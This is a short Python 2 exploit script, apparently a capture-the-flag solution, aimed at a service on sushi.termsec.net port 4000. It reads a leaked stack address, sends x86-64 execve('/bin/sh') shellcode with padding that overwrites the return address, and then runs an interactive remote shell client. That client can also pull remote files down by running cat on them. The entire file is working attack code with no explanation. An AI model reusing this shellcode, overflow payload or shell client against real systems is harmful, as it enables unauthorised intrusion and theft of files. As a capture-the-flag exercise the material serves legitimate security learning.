#!/usr/bin/env python
from struct import *
import socket

rhp     = ("sushi.termsec.net",4000)

#==========
nc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
nc.settimeout(1.5)
nc.connect(rhp)

shellcode  = '\x48\xbb/bin/sh\x00'  # mov rbx, '/bin/sh'
shellcode += '\x53'                 # push rbx
shellcode += '\x48\x89\xe7'         # mov rdi, rsp
shellcode += '\x6a\x00'             # push 0
shellcode += '\x57'                 # push rdi
shellcode += '\x48\x89\xe6'         # mov rsi, rsp
shellcode += '\xb8\x3b\x00\x00\x00' # mov rax, 0x3b
shellcode += '\x0f\x05'             # syscall

addr_stack = int(nc.recv(256).split(' ')[5],16)
nc.sendall(shellcode+'\x00'*(8*9-len(shellcode))+pack('<Q',addr_stack)+'\n')

nc.recv(256)

#==========
    
def shell(cmd):
    if len(cmd)>0:
        nc.sendall(cmd + " 2>&1\x0a")
        
    rsp = ""
    try:
        while True:
            rsp += nc.recv(1024)
    except:
        True
    finally:
        return rsp

if __name__=='__main__':
    while 1:
        cmd = raw_input('$ ')
        if cmd.split(' ')[0]=='GET':
            fname = cmd.split(' ')[1]
            data = shell('cat %s' % fname)
            if len(data)>0:
                open(fname.split('/')[-1],'wb').write(data)
                print '"%s" download succeeded!' % fname
            else:
                print 'download failed...'
                
        elif cmd.split(' ')[0]=='cd':
            shell(cmd)
            pwd = shell('pwd')[:-1]
        elif cmd.split(' ')[0]=='exit':
            break
        else:
            print shell(cmd)
    
nc.close()
#==========
